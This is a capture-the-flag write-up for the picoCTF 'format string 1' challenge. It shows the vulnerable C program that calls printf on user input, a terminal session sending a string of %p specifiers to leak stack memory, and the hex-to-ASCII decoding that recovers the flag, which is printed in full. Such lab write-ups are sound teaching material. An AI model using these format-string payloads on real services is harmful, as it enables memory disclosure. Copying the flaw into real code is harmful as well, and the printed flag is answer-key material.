# format string 1
## Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

link : https://play.picoctf.org/practice/challenge/434

'''bash
abhi@abhi-Lenovo-IdeaPad-S145-15IKB:~/Downloads$ nc mimas.picoctf.net 51737
Give me your order and I'll read it back to you:
text
Here's your order: text
Bye!
flag 
^Z
[1]+  Stopped                 nc mimas.picoctf.net 51737
abhi@abhi-Lenovo-IdeaPad-S145-15IKB:~/Downloads$ cat pico/format-string-1.c 
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
abhi@abhi-Lenovo-IdeaPad-S145-15IKB:~/Downloads$ nc mimas.picoctf.net 51737
Give me your order and I'll read it back to you:
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
Here's your order: 0x402118,(nil),0x7c6a1a966a00,(nil),0x6d2880,0xa347834,0x7fffa7c74ba0,0x7c6a1a757e60,0x7c6a1a97c4d0,0x1,0x7fffa7c74c70,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x35365f673431665f,0x7d313464303935,0x7,0x7c6a1a97e8d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9
Bye!
abhi@abhi-Lenovo-IdeaPad-S145-15IKB:~/Downloads$ 
'''

so the output after cleaning is 

'''bash
0x402118,0x7c6a1a966a00,0x6d2880,0xa347834,0x7fffa7c74ba0,0x7c6a1a757e60,0x7c6a1a97c4d0,0x1,0x7fffa7c74c70,0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x35365f673431665f,0x7d313464303935,0x7,0x7c6a1a97e8d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9
'''

converting this to ascii gives us 

'''bash
ÿ§ÇLp{FTCocip5_14m1n44x4_31y756_g41f_}14d095
'''

after removing all the junk data the hex values for the flag are

'''bash
0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x35365f673431665f,0x7d313464303935
'''

reversing the hex value we get 

'''bash
picoCTF{4n1m41_57y13_4x4_f14g_65590d41}
''' 
